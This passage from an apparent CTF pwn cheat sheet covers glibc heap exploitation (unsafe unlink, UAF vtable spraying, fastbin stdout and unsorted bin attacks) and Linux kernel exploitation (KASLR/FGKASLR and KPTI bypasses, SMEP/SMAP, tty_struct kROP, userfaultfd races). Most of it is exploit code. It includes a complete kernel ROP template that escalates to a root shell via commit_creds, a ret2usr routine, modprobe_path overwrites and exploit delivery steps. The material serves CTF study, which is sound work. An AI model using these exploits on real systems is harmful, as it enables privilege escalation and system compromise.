add_memo(248, p64(0) + p64(0) + p64(bss_table + 0x100 + 8 - 24) +
         p64(bss_table + 0x100 + 8 - 16) + b'A' * 208 + p64(prev_size))

# Step 2: Fake BSS chunk with size spanning to top chunk
fake_size = heap_base + 0x310 - bss_addr + 0x1  # | PREV_INUSE
edit_memo(3, b'A' * (256-32) + p64(prev_size) + p64(fake_size) + b'A' * 15)
delete_memo(1)  # consolidation moves top chunk to BSS

# Step 3: malloc now returns BSS memory — overwrite global pointers
add_memo(size, p64(environ_addr))  # write &environ into note slot
# read_memo leaks stack address from environ
```

**Key insight:** Standard unsafe unlink gives a single write primitive. This variant extends it to full arbitrary read/write by weaponizing the top chunk consolidation: any subsequent `malloc` returns BSS-overlapping memory, turning one write into unlimited controlled allocations within the global data segment.

---

## UAF Vtable Pointer Encoding Shell Argument (BCTF 2017)

**Pattern:** After UAF, heap spray fills memory with `system()` addresses at a 3-byte offset. The vtable pointer address `0x??006873` encodes ASCII `"sh\x00"` at the object start, so calling `system()` through the vtable executes `system("sh")`.

```python
from pwn import *

# Heap spray: fill 16MB with system() address at offset +3
# Each spray chunk: 3 bytes padding + 8 bytes system_addr, repeated
spray_unit = b"\x00" * 3 + p64(system_addr)
spray_data = spray_unit * (0x1000000 // len(spray_unit))

# Trigger heap spray via application interface
for i in range(spray_count):
    alloc(spray_data[:chunk_size])

# UAF object at address 0xXX006873
# Bytes at object start: 73 68 00 XX = "sh\x00..."
# When vtable call dispatches: system(this) → system("sh")

# Trigger: free the target object, then invoke its virtual method
free(target_obj)
trigger_vtable_call(target_obj)  # calls system("sh")
```

**Key insight:** The vtable pointer value itself serves as the string argument to `system()`. By arranging the heap spray so objects land at addresses containing `0x6873` (ASCII "sh") in the low bytes, the object's address doubles as a valid shell command string. This eliminates the need for a separate controlled string — the pointer IS the argument.

**When to recognize:** UAF on a C++ object with virtual methods, where you control heap layout but not the exact content at the object's `this` pointer. If `system()` is called with `this` as the first argument (common in vtable dispatch), the object's address just needs to decode as a valid command string.

**References:** BCTF 2017

---

## Fastbin stdout Vtable Two-Stage Hijack for PIE + Full RELRO (ASIS CTF 2017)

**Pattern:** When PIE and Full RELRO block GOT overwrite, target libc's stdout FILE structure via fastbin attack, using a two-stage vtable hijack.

```python
from pwn import *

# Stage 1: Fastbin double-free targeting fake chunk inside stdout
# Use 0x7f byte in libc stdout region as fake chunk size (matches 0x70 fastbin)
fake_chunk_addr = libc.sym['_IO_2_1_stdout_'] + 0x91  # contains 0x7f byte

# Double-free in 0x70 fastbin
alloc_a = malloc(0x60)
alloc_b = malloc(0x60)
free(alloc_a)
free(alloc_b)
free(alloc_a)  # double-free: fastbin 0x70 = [a -> b -> a]

# Redirect fastbin to stdout region
malloc(0x60, p64(fake_chunk_addr))  # a's fd -> fake chunk in stdout
malloc(0x60)                         # returns b
malloc(0x60)                         # returns a again

# Stage 2a: First vtable overwrite → gets()
# rdi points to stdout struct, so gets(stdout) reads input into stdout
fake_stdout_chunk = malloc(0x60)     # returns fake chunk overlapping stdout
write_to(fake_stdout_chunk, p64(gets_addr))  # vtable → gets

# Stage 2b: gets() overwrites stdout vtable again → system()
# Next puts() call triggers: vtable lookup → gets(stdout)
# gets() reads from stdin into the stdout struct, overwriting vtable again
# Input: "1\x80;/bin/sh;" — new vtable points to system()
# After gets() returns, next output call triggers system()
```

**Key insight:** The 0x7f byte naturally present in libc's stdout region satisfies fastbin size validation for the 0x70 bin. Two-stage hijack: first redirect vtable to `gets()` (since rdi=stdout FILE*), then `gets()` reads a second vtable pointing to `system()` along with the command string. This technique works even with PIE + Full RELRO because it targets libc's writable data segment, not the GOT.

**When to recognize:** Challenge has PIE + Full RELRO, with a heap UAF or double-free. The 0x7f byte in libc's FILE structures is a universal fastbin target. Check `_IO_2_1_stdout_` region for 0x7f bytes at aligned offsets suitable as fake chunk sizes.

**References:** ASIS CTF 2017

---

## _IO_buf_base Null Byte Overwrite for stdin Hijack (Tokyo Westerns 2017)

**Pattern:** A null-byte (off-by-one) heap overflow corrupts the least significant byte of `_IO_buf_base` in stdin's `_IO_FILE` structure. This redirects the stdin input buffer pointer to `_short_buf` — a small internal buffer that lies within the FILE struct itself. Subsequent `scanf`/`fgets` calls then write attacker input directly into the FILE structure, enabling overwrite of `_IO_buf_base`/`_IO_buf_end` to arbitrary addresses for a full write primitive.

**How it works:**
```c
// Null byte overwrite targets _IO_buf_base's LSB
// Before: _IO_buf_base = 0x7f...XX00  (points to heap input buffer)
// After:  _IO_buf_base = 0x7f...0000  (points into FILE struct itself,
//                                       landing near _short_buf)
// Next scanf() / fgets() reads input into the FILE struct
// Overwrite _IO_buf_base/_IO_buf_end fields with arbitrary addresses
// Now stdin reads from attacker-controlled memory address
```

**Exploitation chain:**
```python
# 1. Arrange heap: allocation immediately before stdin's _IO_buf_base
#    (requires heap grooming so chunk is adjacent to FILE struct)

# 2. Null-byte overflow: write one 0x00 byte past chunk boundary
#    → corrupts _IO_buf_base LSB → points into FILE struct

# 3. Next read (scanf/fgets): input written into FILE struct fields
#    → overwrite _IO_buf_base = target_addr, _IO_buf_end = target_addr + size

# 4. Next read: stdin reads from target_addr → arbitrary write primitive
#    → overwrite __free_hook with system() or one_gadget

# 5. Trigger: call a function that invokes free() with a controlled pointer
#    → system("/bin/sh")
```

**Key insight:** Null-byte overflow into stdin's `_IO_buf_base` relocates the input buffer into the FILE structure itself, providing arbitrary write via standard I/O functions. The `_short_buf` field within the FILE struct is the natural landing target when the LSB is zeroed.

**References:** Tokyo Westerns CTF 2017

---

## glibc 2.24+ _IO_FILE Vtable Validation Bypass (HITCON 2017)

**Pattern:** glibc 2.24+ validates vtable pointers against the `_IO_vtables` section, rejecting pointers outside that range. Bypass: use unchecked sub-function entries reachable via two-hop dereference. Arrange two heap pointers 0x10 bytes apart (via unsorted bin fd/bk). The first pointer is set to `valid_vtable_addr - 0x18`; the second to `system()`. `_IO_flush_all_lockp` dereferences `*(addr + 0xd8) + 0x18`, landing in an unchecked sub-function that calls `*(addr + 0xe8)`.

**How the two-hop bypass works:**
```c
// _IO_flush_all_lockp calls:
//   fp->vtable->_IO_overflow(fp)
// With a valid vtable addr but offset trick:
//   vtable[offset] → points to sub-function outside vtable validation
//   sub-function dereferences further → calls system()

// Heap layout using unsorted bin fd/bk (0x10 apart):
//   [heap + 0x00]: valid_vtable_addr - 0x18   (passes vtable check at offset 0xd8)
//   [heap + 0x10]: system()                   (called via *(addr + 0xe8) dereference)
```

**Setup:**
```python
# Place two pointers 0x10 apart using unsorted bin fd/bk as write targets
# unsorted bin attack: write main_arena+88 to target, leak heap/libc
# Craft FILE struct with _flags = " sh\x00" for system() argument
# Trigger exit() → _IO_flush_all_lockp → two-hop call → system("sh")
```

**Key insight:** Vtable validation checks the address range but not indirect entries reachable via sub-functions — two-hop call chains bypass `__IO_vtable_check`. The fd/bk pointers of a chunk in the unsorted bin sit exactly 0x10 bytes apart, making them natural targets for the two adjacent pointer slots needed.

**References:** HITCON CTF 2017

---

## Unsorted Bin Attack on stdin _IO_buf_end (HITCON 2017)

**Pattern:** An off-by-one NULL byte creates overlapping heap chunks. Free into the unsorted bin, then use the unsorted bin attack (corrupting `bk` of an unsorted bin chunk) to overwrite `_IO_buf_end` of stdin's FILE structure with a large libc address (main_arena+88). The next `scanf` call then reads attacker data into libc's stdin buffer region — enabling overwrite of `__malloc_hook` with a one_gadget.

**Exploit chain:**
```python
# 1. Off-by-one NULL: corrupt next chunk's PREV_INUSE, set prev_size
#    → create overlapping chunks via heap consolidation

# 2. Free victim into unsorted bin
#    → victim->fd = main_arena+88, victim->bk = main_arena+96

# 3. Unsorted bin attack: set victim->bk = &stdin._IO_buf_end - 0x10
#    When malloc() removes victim from unsorted bin:
#    → victim->bk->fd = victim   (writes heap address → _IO_buf_end)
#    But for full attack: set bk = &target - 0x10 to write main_arena+88 there

# 4. stdin._IO_buf_end is now a large value → next scanf reads huge input
#    → attacker data written into libc stdin buffer region
#    → __malloc_hook in that region gets overwritten with one_gadget

# 5. Trigger: any malloc() call → __malloc_hook → one_gadget → shell
```

**Key insight:** Unsorted bin attack on `_IO_buf_end` causes `scanf` to read from an attacker-controlled buffer region inside libc's data segment. Since `__malloc_hook` resides near the stdin buffer in libc, a single large read can overwrite it with a one_gadget address.

**References:** HITCON CTF 2017

---

## Unsorted Bin Corruption via mp_ Structure (HITCON 2017)

**Pattern:** glibc's `mp_` (`malloc_par`) global structure lies near the unsorted bin in libc's data segment. A heap overflow combined with unsorted bin corruption overwrites `mp_->bk` with an address inside `mp_`. The `mp_` structure contains fields that, when interpreted as a free chunk header, pass unsorted bin validation (`size < system_mem`). Allocating from this "chunk" grants write access inside `mp_`, enabling overwrite of `__malloc_hook`. Requires partial ASLR brute-force (1/16 chance) for the heap address alignment.

**Why mp_ works:**
```c
// mp_ layout (glibc 2.23, near unsorted bin in libc BSS):
// struct malloc_par {
//   unsigned long  trim_threshold;   // offset 0x00 — large value, passes size check
//   unsigned long  top_pad;          // offset 0x08
//   ...
//   unsigned long  system_mem;       // offset 0x48 — must be > fake chunk size
// };
// mp_.trim_threshold interpreted as chunk size → satisfies unsorted bin checks
// malloc from mp_-as-chunk returns memory overlapping mp_ fields
// Write __malloc_hook offset within mp_ → control next malloc → one_gadget
```

**Exploitation:**
```python
# Heap overflow: corrupt unsorted bin chunk's bk to point into mp_
corrupted_bk = mp_addr + FAKE_CHUNK_OFFSET  # offset where size field looks valid

# Trigger unsorted bin traversal: malloc() of appropriate size
# → unsorted bin unlinks fake chunk at mp_
# → returns pointer into mp_ data
# Write one_gadget to __malloc_hook offset within returned chunk
malloc(size)  # returns mp_+0x10
write_to_result(one_gadget)  # overwrites __malloc_hook

# Trigger: next malloc() → __malloc_hook → one_gadget → shell
```

**Key insight:** glibc's `mp_` global structure passes unsorted bin validation naturally — its `trim_threshold` field serves as a convincing fake chunk size. A fake free chunk planted via unsorted bin corruption there enables allocation directly into glibc metadata, bypassing the need for any heap-side fake chunk construction.

**References:** HITCON CTF 2017


# kernel-bypass

# CTF Pwn - Kernel Protection Bypass

## Table of Contents
- [KASLR and FGKASLR Bypass](#kaslr-and-fgkaslr-bypass)
  - [KASLR Bypass via Stack Leak (hxp CTF 2020)](#kaslr-bypass-via-stack-leak-hxp-ctf-2020)
  - [FGKASLR Bypass (hxp CTF 2020)](#fgkaslr-bypass-hxp-ctf-2020)
- [KPTI Bypass Methods](#kpti-bypass-methods)
  - [Method 1: swapgs_restore Trampoline](#method-1-swapgs_restore-trampoline)
  - [Method 2: Signal Handler (SIGSEGV)](#method-2-signal-handler-sigsegv)
  - [Method 3: modprobe_path via ROP](#method-3-modprobe_path-via-rop)
  - [Method 4: core_pattern via ROP](#method-4-core_pattern-via-rop)
- [SMEP / SMAP Bypass](#smep--smap-bypass)
- [KPTI / SMEP / SMAP Quick Reference](#kpti--smep--smap-quick-reference)
- [GDB Kernel Module Debugging](#gdb-kernel-module-debugging)
- [Initramfs and virtio-9p Workflow](#initramfs-and-virtio-9p-workflow)
- [Finding Symbol Offsets Without CONFIG_KALLSYMS_ALL](#finding-symbol-offsets-without-config_kallsyms_all)
- [Exploit Templates](#exploit-templates)
  - [Full Kernel ROP Template (SMEP + KPTI)](#full-kernel-rop-template-smep--kpti)
  - [ret2usr Template (No SMEP/SMAP)](#ret2usr-template-no-smepsmap)
- [Exploit Delivery](#exploit-delivery)

---

## KASLR and FGKASLR Bypass

### KASLR Bypass via Stack Leak (hxp CTF 2020)

Leak a kernel text pointer from the stack to compute the KASLR (Kernel Address Space Layout Randomization) slide:

```c
// Kernel base without KASLR
#define KERNEL_BASE 0xffffffff81000000

unsigned long leak[40];
read(fd, leak, sizeof(leak));  // oversized read from vulnerable module

// leak[38] contains a randomized kernel text pointer
unsigned long kaslr_offset = (leak[38] & 0xffffffffffff0000) - KERNEL_BASE;

// Apply offset to all addresses
unsigned long commit_creds_kaslr = commit_creds + kaslr_offset;
unsigned long pop_rdi_ret_kaslr = pop_rdi_ret + kaslr_offset;
```

**Other KASLR leak sources:**
- `/proc/kallsyms` (if `kptr_restrict != 1`)
- `dmesg` (if `dmesg_restrict != 1`)
- Kernel oops messages (if oops doesn't panic)
- UAF reading freed kernel objects containing text pointers
- `modprobe_path` has 1-byte entropy — brute-forceable with AAW

### FGKASLR Bypass (hxp CTF 2020)

FGKASLR (Function Granular KASLR) randomizes individual functions, but the early `.text` section (up to approximately offset `0x400dc6`) remains at a fixed offset from the kernel base. Gadgets from this range are safe to use.

**Method 1: Use only unaffected `.text` gadgets**

```bash
# Find gadgets only in the non-randomized range
ropr --no-uniq -R "^pop rdi; ret;|^swapgs" ./vmlinux | \
    awk -F: '{if (strtonum("0x"$1) < 0xffffffff81400dc6) print}'
```

`swapgs_restore_regs_and_return_to_usermode` is located in the unaffected `.text` section and can be used with only the KASLR base offset.

**Method 2: Resolve randomized functions via `__ksymtab`**

`__ksymtab` entries use relative offsets, not absolute addresses. The `__ksymtab` section itself is not randomized by FG-KASLR:

```c
// struct kernel_symbol { int value_offset; int name_offset; int namespace_offset; };
// Real address = &ksymtab_entry + entry.value_offset

unsigned long ksymtab_prepare_kernel_cred = 0xffffffff81f8d4fc; // from /proc/kallsyms
unsigned long ksymtab_commit_creds = 0xffffffff81f87d90;

// ROP chain to read ksymtab entry and compute real address:
// 1. Load ksymtab address into rax
payload[off++] = pop_rax_ret + kaslr_offset;
payload[off++] = ksymtab_prepare_kernel_cred + kaslr_offset;
// 2. Read 4-byte relative offset: mov eax, [rax]
payload[off++] = mov_eax_deref_rax_pop1_ret + kaslr_offset;
payload[off++] = 0x0;
// 3. Return to userland to compute: real_addr = ksymtab_addr + kaslr_offset + offset
payload[off++] = kpti_trampoline + kaslr_offset + 22;
payload[off++] = 0; payload[off++] = 0;
payload[off++] = (unsigned long)resolve_and_continue;
// ...

void resolve_and_continue() {
    // eax contains the relative offset read from ksymtab
    unsigned long resolved = ksymtab_prepare_kernel_cred + kaslr_offset + fetched_offset;
    // Now use resolved address in next ROP stage
}
```

**Key insight:** FG-KASLR requires a multi-stage exploit: first return to userland to compute resolved addresses from `__ksymtab` offsets, then re-enter the kernel with a second ROP chain using the resolved function addresses.

---

## KPTI Bypass Methods

KPTI (Kernel Page Table Isolation) separates kernel and user page tables. A simple `swapgs; iretq` fails because the user page table is not restored. Four bypass approaches:

### Method 1: swapgs_restore Trampoline

The kernel function `swapgs_restore_regs_and_return_to_usermode` handles the full KPTI return sequence. Jump to offset +22 to skip the register-restore prologue and land directly at the CR3-swap + `swapgs` + `iretq` sequence:

```c
// Symbol from /proc/kallsyms or vmlinux
unsigned long kpti_trampoline = 0xffffffff81200f10;

// In ROP chain, after commit_creds:
payload[off++] = kpti_trampoline + 22;  // skip to mov rdi,rsp; ... swapgs; iretq
payload[off++] = 0x0;                    // padding (popped by trampoline)
payload[off++] = 0x0;                    // padding
payload[off++] = user_rip;
payload[off++] = user_cs;
payload[off++] = user_rflags;
payload[off++] = user_sp;
payload[off++] = user_ss;
```

**Key insight:** The +22 offset skips the function's register pop/restore sequence and enters directly at the point where it swaps CR3, does `swapgs`, and `iretq`. This offset may vary between kernel versions — verify by disassembling the function.

### Method 2: Signal Handler (SIGSEGV)

Register a SIGSEGV handler before the exploit. When `iretq` returns without KPTI handling, the page fault triggers SIGSEGV, which the handler catches to spawn a shell:

```c
#include <signal.h>

void spawn_shell() {
    if (getuid() == 0) system("/bin/sh");
}

// Before exploit:
struct sigaction sa;
sa.sa_handler = spawn_shell;
sigemptyset(&sa.sa_mask);
sa.sa_flags = 0;
sigaction(SIGSEGV, &sa, NULL);
```

The ROP chain still calls `commit_creds(prepare_kernel_cred(0))` and does `swapgs; iretq` to userland. Even though the return faults due to wrong page table, the credentials are already committed. The SIGSEGV handler runs with root privileges.

### Method 3: modprobe_path via ROP

Instead of returning to userland, overwrite `modprobe_path` directly from the kernel ROP chain using `pop rax; pop rdi; mov [rdi], rax; ret` gadgets. No KPTI handling needed — the write happens entirely in kernel context.

See [kernel.md - modprobe_path Overwrite](kernel.md#modprobepath-overwrite) for the full technique, trigger sequence, and ROP payload.

### Method 4: core_pattern via ROP

Similar to Method 3 but overwrites `core_pattern` with a pipe command (e.g., `"|/evil"`). When any process crashes, the kernel executes the piped program as root.

See [kernel.md - core_pattern Overwrite](kernel.md#corepattern-overwrite) for the full technique and how to find the `core_pattern` address.

---

## SMEP / SMAP Bypass

**SMEP (Supervisor Mode Execution Prevention):** Blocks executing userland pages from kernel mode.
- **Bypass:** Use kernel ROP (kROP) chains — all gadgets from kernel `.text`. See [kernel.md - Kernel ROP](kernel.md#kernel-rop-with-preparekernelcred-commitcreds).

**SMAP (Supervisor Mode Access Prevention):** Blocks accessing userland memory from kernel mode.
- **Bypass:** kROP with heap-resident chain (all data in kernel heap), or `stac`/`clac` gadgets to temporarily disable SMAP.

**Direct CR4 modification (old kernels):** Write to CR4 to clear SMEP/SMAP bits. Blocked on modern kernels by `native_write_cr4()` pinning.

---

## KPTI / SMEP / SMAP Quick Reference

| Protection | Blocks | Bypass |
|-----------|--------|--------|
| SMEP | Executing userland pages from kernel | kROP (kernel ROP chain) — see [kernel.md](kernel.md#kernel-rop-with-preparekernelcred-commitcreds) |
| SMAP | Accessing userland memory from kernel | kROP with heap-resident chain, `stac`/`clac` gadgets |
| No SMEP/SMAP | (nothing) | [ret2usr](kernel.md#ret2usr-no-smepsmap) — directly call userland privesc function |
| KPTI | Kernel page table isolation | [Trampoline](#method-1-swapgs_restore-trampoline), [signal handler](#method-2-signal-handler-sigsegv), [modprobe_path](#method-3-modprobe_path-via-rop), [core_pattern](#method-4-core_pattern-via-rop) |

See [KPTI Bypass Methods](#kpti-bypass-methods) for detailed bypass techniques with code.

---

## GDB Kernel Module Debugging

Load vulnerable kernel module symbols in GDB for source-level debugging:

```bash
# 1. Find module load address (as root inside QEMU)
cat /proc/modules
# vuln 16384 0 - Live 0xffffffffc0000000 (O)

# 2. In GDB, load module symbols at that address
(gdb) target remote localhost:1234
(gdb) add-symbol-file vuln.ko 0xffffffffc0000000
(gdb) b swrite            # breakpoint on module function
(gdb) c

# 3. Inspect stack after breakpoint hit
(gdb) x/20xg $rsp-0x90    # examine stack buffer
(gdb) search "AAAAAAAA"   # find buffer location (pwndbg)
```

**Note:** `/proc/modules` requires root to read actual addresses. Non-root users see zeroed addresses. Modify `/init` to keep root for debugging.

---

## Initramfs and virtio-9p Workflow

**Shared directory via virtio-9p** — transfer exploits between host and QEMU without rebuilding initramfs:
```bash
# Add to QEMU launch script:
-fsdev local,security_model=passthrough,id=fsdev0,path=./share \
-device virtio-9p-pci,id=fs0,fsdev=fsdev0,mount_tag=hostshare

# Inside QEMU guest (add to /init or run manually):
mkdir -p /home/ctf && mount -t 9p -o trans=virtio,version=9p2000.L hostshare /home/ctf

# On host, compile exploit into shared directory:
gcc exploit.c -static -o ./share/exploit
```

**Extract and modify initramfs:**
```bash
# Extract
mkdir initramfs && cd initramfs
gzip -dc ../initramfs.cpio.gz | cpio -idmv

# Modify /init for debugging (get root shell instead of unprivileged user)
# Comment out: exec su -l ctf
# Add: /bin/sh

# Rebuild
find . -print0 | cpio --null -ov --format=newc | gzip -9 > ../initramfs.cpio.gz
```

**Key modifications to `/init` for debugging:**
- Comment out `exec su -l ctf` (or similar) to keep root privileges
- Comment out `echo 1 > /proc/sys/kernel/kptr_restrict` to see `/proc/kallsyms`
- Comment out `echo 1 > /proc/sys/kernel/dmesg_restrict` to see dmesg
- Comment out `chmod 400 /proc/kallsyms` to read symbol addresses

---

## Finding Symbol Offsets Without CONFIG_KALLSYMS_ALL

`/proc/kallsyms` only shows `.text` symbols by default. Data symbols like `modprobe_path` and `core_pattern` require `CONFIG_KALLSYMS_ALL=y`.

**Finding modprobe_path:**

```bash
# 1. Get call_usermodehelper_setup address (always in /proc/kallsyms)
cat /proc/kallsyms | grep call_usermodehelper_setup

# 2. In GDB, set breakpoint and trigger
hb *0xffffffff810c8c80
# Trigger: echo -ne '\xff\xff\xff\xff' > /tmp/x && chmod +x /tmp/x && /tmp/x

# 3. Check first argument (RDI = modprobe_path)
(gdb) p/x $rdi
# 0xffffffff8265ff00
(gdb) x/s $rdi
# "/sbin/modprobe"
```

**Finding core_pattern:**

```bash
# 1. Set breakpoint on override_creds (called by do_coredump)
# 2. Crash a process: gcc -static -o crash -xc - <<< 'int main(){((void(*)())0)();}'
# 3. After override_creds returns, disassemble — look for data address in movzx
```

---

## Exploit Templates

### Full Kernel ROP Template (SMEP + KPTI)

Complete exploit for kernel stack overflow with SMEP and KPTI enabled:

```c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

// Addresses from vmlinux (apply KASLR offset if needed)
unsigned long prepare_kernel_cred;
unsigned long commit_creds;
unsigned long pop_rdi_ret;
unsigned long mov_rdi_rax_pop1_ret;
unsigned long kpti_trampoline;

// Userland state
unsigned long user_cs, user_ss, user_sp, user_rflags, user_rip;

void save_userland_state() {
    __asm__(".intel_syntax noprefix;"
        "mov %[cs], cs;"
        "mov %[ss], ss;"
        "mov %[sp], rsp;"
        "pushf; pop %[rflags];"
        ".att_syntax;"
        : [cs] "=r"(user_cs), [ss] "=r"(user_ss),
          [sp] "=r"(user_sp), [rflags] "=r"(user_rflags));
    user_rip = (unsigned long)spawn_shell;
}

void spawn_shell() {
    if (getuid() == 0) {
        printf("[+] root!\n");
        system("/bin/sh");
    } else {
        printf("[-] privesc failed\n");
        exit(1);
    }
}

int main() {
    save_userland_state();
    int fd = open("/dev/hackme", O_RDWR);

    // Step 1: Leak canary + KASLR base
    unsigned long leak[40];
    read(fd, leak, sizeof(leak));
    unsigned long cookie = leak[16];
    unsigned long kaslr_offset = (leak[38] & 0xffffffffffff0000) - 0xffffffff81000000;

    // Step 2: Apply KASLR offset
    prepare_kernel_cred += kaslr_offset;
    commit_creds += kaslr_offset;
    pop_rdi_ret += kaslr_offset;
    mov_rdi_rax_pop1_ret += kaslr_offset;
    kpti_trampoline += kaslr_offset;

    // Step 3: Build ROP chain
    unsigned long payload[50];
    int off = 16;
    payload[off++] = cookie;
    payload[off++] = 0;  // rbx
    payload[off++] = 0;  // r12
    payload[off++] = 0;  // rbp

    // prepare_kernel_cred(0) → commit_creds(result)
    payload[off++] = pop_rdi_ret;
    payload[off++] = 0;
    payload[off++] = prepare_kernel_cred;
    payload[off++] = mov_rdi_rax_pop1_ret;
    payload[off++] = 0;  // pop rbx padding
    payload[off++] = commit_creds;

    // KPTI-safe return to userland
    payload[off++] = kpti_trampoline + 22;
    payload[off++] = 0;  // padding
    payload[off++] = 0;  // padding
    payload[off++] = user_rip;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;

    write(fd, payload, sizeof(payload));
    return 0;
}
```

### ret2usr Template (No SMEP/SMAP)

```c
void privesc() {
    __asm__(".intel_syntax noprefix;"
        "movabs rax, %[prepare_kernel_cred];"
        "xor rdi, rdi;"
        "call rax;"
        "mov rdi, rax;"
        "movabs rax, %[commit_creds];"
        "call rax;"
        "swapgs;"
        "mov r15, %[user_ss];   push r15;"
        "mov r15, %[user_sp];   push r15;"
        "mov r15, %[user_rflags]; push r15;"
        "mov r15, %[user_cs];   push r15;"
        "mov r15, %[user_rip];  push r15;"
        "iretq;"
        ".att_syntax;"
        : : [prepare_kernel_cred] "r"(prepare_kernel_cred),
            [commit_creds] "r"(commit_creds),
            [user_ss] "r"(user_ss), [user_sp] "r"(user_sp),
            [user_rflags] "r"(user_rflags),
            [user_cs] "r"(user_cs), [user_rip] "r"(user_rip));
}
```

---

## Exploit Delivery

Kernel exploits are typically large static binaries. Minimize size for remote delivery:

```bash
# 1. Compile with musl-libc (much smaller than glibc)
musl-gcc -static -O2 -o exploit exploit.c

# 2. Strip symbols
strip exploit

# 3. Compress and encode for transfer
gzip exploit && base64 exploit.gz > exploit.b64

# 4. On target: decode and decompress
base64 -d exploit.b64 | gunzip > /tmp/exploit && chmod +x /tmp/exploit

# Optional: UPX compression (further reduces size)
upx --best exploit
```

**Common pitfall:** If the exploit uses `setxattr()` with a file path, ensure the file exists in the remote environment. Local path (`/tmp/exploit`) may differ from remote path (`/home/user/exploit`).


# kernel-techniques

# CTF Pwn - Kernel Exploitation Techniques

## Table of Contents
- [tty_struct RIP Hijack and kROP](#tty_struct-rip-hijack-and-krop)
  - [kROP via Fake Vtable on tty_struct](#krop-via-fake-vtable-on-tty_struct)
  - [AAW via ioctl Register Control](#aaw-via-ioctl-register-control)
- [userfaultfd Race Stabilization](#userfaultfd-race-stabilization)
  - [Alternative Race Techniques (uffd Disabled)](#alternative-race-techniques-uffd-disabled)
- [SLUB Allocator Internals](#slub-allocator-internals)
  - [Freelist Pointer Hardening](#freelist-pointer-hardening)
  - [Freelist Obfuscation (CONFIG_SLAB_FREELIST_HARDEN)](#freelist-obfuscation-config_slab_freelist_harden)
- [Leak via Kernel Panic](#leak-via-kernel-panic)
- [Race Window Extension via MADV_DONTNEED + mprotect (DiceCTF 2026)](#race-window-extension-via-madv_dontneed--mprotect-dicectf-2026)
- [Cross-Cache Attack via CPU-Split Strategy (DiceCTF 2026)](#cross-cache-attack-via-cpu-split-strategy-dicectf-2026)
- [PTE Overlap Primitive for File Write (DiceCTF 2026)](#pte-overlap-primitive-for-file-write-dicectf-2026)

For kernel fundamentals (environment setup, heap spray structures, stack overflow, privilege escalation, modprobe_path, core_pattern), see [kernel.md](kernel.md).

For protection bypass techniques (KASLR, FGKASLR, KPTI, SMEP, SMAP), GDB debugging, initramfs workflow, and exploit templates, see [kernel-bypass.md](kernel-bypass.md).

---

## tty_struct RIP Hijack and kROP

### kROP via Fake Vtable on tty_struct

With sequential write over `tty_struct` (at least 0x200 bytes), build a two-phase kROP chain entirely within the structure:

```text
tty_struct layout for kROP:
  +0x00: magic, kref   -> 0x5401 (preserve paranoia check)
  +0x08: dev            -> addr of `pop rsp` gadget (return addr after `leave`)
  +0x10: driver         -> &tty_struct + 0x170 (stack pivot target; must be valid kheap addr)
  +0x18: ops            -> &tty_struct + 0x50 (pointer to fake vtable)
  ...
  +0x50:                -> fake vtable (0x120 bytes), ioctl entry points to `leave` gadget
  ...
  +0x170:               -> actual ROP chain (commit_creds, prepare_kernel_cred, etc.)
```

**Execution flow:**
1. `ioctl(ptmx_fd, cmd, arg)` -> `tty_ioctl()` -> paranoia check passes (magic=0x5401)
2. `tty->ops->ioctl()` -> jumps to `leave` gadget at fake vtable
3. `leave` = `mov rsp, rbp; pop rbp` -- RBP points to `tty_struct` itself
4. RSP now points to `tty_struct + 0x08` (the `dev` field)
5. `ret` to `pop rsp` gadget at `dev`, pops `driver` as new RSP
6. RSP now at `tty_struct + 0x170` -> actual ROP chain runs

**Key insight:** RBP points to `tty_struct` at the time of the vtable call. The `leave` instruction pivots the stack into the structure itself, enabling a two-phase bootstrap: first `leave` to enter the structure, then `pop rsp` to jump to the ROP chain area.

**Alternative:** The gadget `push rdx; ... pop rsp; ... ret` at a fixed offset in many kernels enables direct stack pivot via `ioctl`'s 3rd argument (RDX is fully controlled):

```c
// ioctl(fd, cmd, arg) -> RDX = arg (64-bit controlled)
// Gadget: push rdx; mov ebp, imm; pop rsp; pop r13; pop rbp; ret
// Effect: RSP = arg -> ROP chain at user-specified address
ioctl(ptmx_fd, 0, (unsigned long)rop_chain_addr);
```

### AAW via ioctl Register Control

When full kROP is not needed, use `tty_struct` for Arbitrary Address Write (AAW) to overwrite `modprobe_path`:

Register control from `ioctl(fd, cmd, arg)`:
- `cmd` (32-bit) -> partial control of RBX, RCX, RSI
- `arg` (64-bit) -> full control of RDX, R8, R12

Write gadget in fake vtable: `mov DWORD PTR [rdx], esi; ret`

```c
// Repeated ioctl calls write 4 bytes at a time to modprobe_path
for (int i = 0; i < 4; i++) {
    uint32_t val = *(uint32_t*)("/tmp/evil.sh\0\0\0\0" + i*4);
    ioctl(ptmx_fd, val, modprobe_path_addr + i*4);
}
```

---

## userfaultfd Race Stabilization

`userfaultfd` (uffd) makes kernel race conditions deterministic by pausing execution at page faults.

**How it works:**
1. `mmap()` a region with `MAP_PRIVATE` (no physical pages allocated)
2. Register the region with `userfaultfd` via `ioctl(UFFDIO_REGISTER)`
3. When the kernel accesses this region (e.g., during `copy_from_user()`), a page fault occurs
4. The faulting kernel thread blocks until userspace handles the fault
5. During the block, the exploit modifies shared state (freeing objects, spraying heap, etc.)
6. Userspace resolves the fault via `ioctl(UFFDIO_COPY)`, kernel thread resumes

```c
// Setup
int uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
struct uffdio_api api = { .api = UFFD_API, .features = 0 };
ioctl(uffd, UFFDIO_API, &api);

// Register mmap'd region
void *region = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE,
                    MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
struct uffdio_register reg = {
    .range = { .start = (unsigned long)region, .len = 0x1000 },
    .mode = UFFDIO_REGISTER_MODE_MISSING
};
ioctl(uffd, UFFDIO_REGISTER, &reg);

// Fault handler thread
void *handler(void *arg) {
    struct pollfd pfd = { .fd = uffd, .events = POLLIN };
    while (poll(&pfd, 1, -1) > 0) {
        struct uffd_msg msg;
        read(uffd, &msg, sizeof(msg));
        // >>> RACE WINDOW: kernel thread is paused <<<
        // Free target object, spray heap, etc.

        // Resolve fault to resume kernel
        struct uffdio_copy copy = {
            .dst = msg.arg.pagefault.address & ~0xFFF,
            .src = (unsigned long)src_page,
            .len = 0x1000
        };
        ioctl(uffd, UFFDIO_COPY, &copy);
    }
}
```

